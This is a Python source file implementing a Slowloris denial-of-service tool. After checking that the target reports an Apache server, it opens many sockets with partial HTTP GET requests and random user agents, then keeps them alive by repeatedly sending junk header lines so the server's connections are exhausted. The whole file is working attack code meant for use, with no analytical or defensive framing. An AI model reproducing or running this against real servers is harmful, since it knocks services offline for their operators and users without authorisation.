#!/usr/bin/env python3
import logging
import random
import socket
import ssl
import time
import urllib.request
from .userAgent import UserAgent


class SlowLoris(object):

    def __init__(self, args):
        if (not self.check_args(args)):
            logging.error("Args Error")
            exit(1)
        self.args = args
        self.ip = socket.gethostbyname(self.args.host)
        self.list_of_sockets = []
        self.ua = UserAgent()
        if (self.check_server()):
            logging.error("Server is not Apache")
            exit(1)

    def check_args(self, args):
        if (isinstance(args.host, str) and isinstance(args.port, int)
            and isinstance(args.sockets, int)
            and isinstance(args.timeout, int)
            and isinstance(args.wait, int)):
            return True
        return False

    def check_server(self):
        response = urllib.request.urlopen("http://" + self.args.host)
        print("Server Information:\n\n" + str(response.headers))
        if "Apache" not in response.headers['Server']:
            return True
        return False

    def init_socket(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.args.timeout)
        if self.args.https:
            s = ssl.wrap_socket(s)
        s.connect((self.ip, self.args.port))
        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
        s.send("User-Agent: {}\r\n".format(self.ua.random()).encode("utf-8"))
        s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
        return s

    def start(self):
        logging.info("Attacking %s with %s sockets.",
                     self.ip, self.args.sockets)

        while True:
            for _ in range(self.args.sockets - len(self.list_of_sockets)):
                logging.debug("Creating socket #%s", _)
                try:
                    s = self.init_socket()
                    if s:
                        self.list_of_sockets.append(s)
                except socket.error:
                    break
            logging.info(
                "Sending keep-alive headers... Socket count: %s",
                len(self.list_of_sockets))
            for s in list(self.list_of_sockets):
                try:
                    s.send(
                        "X-a: {}\r\n".format(random.randint(1, 5000))
                        .encode("utf-8"))
                except socket.error:
                    self.list_of_sockets.remove(s)
            time.sleep(self.args.wait)
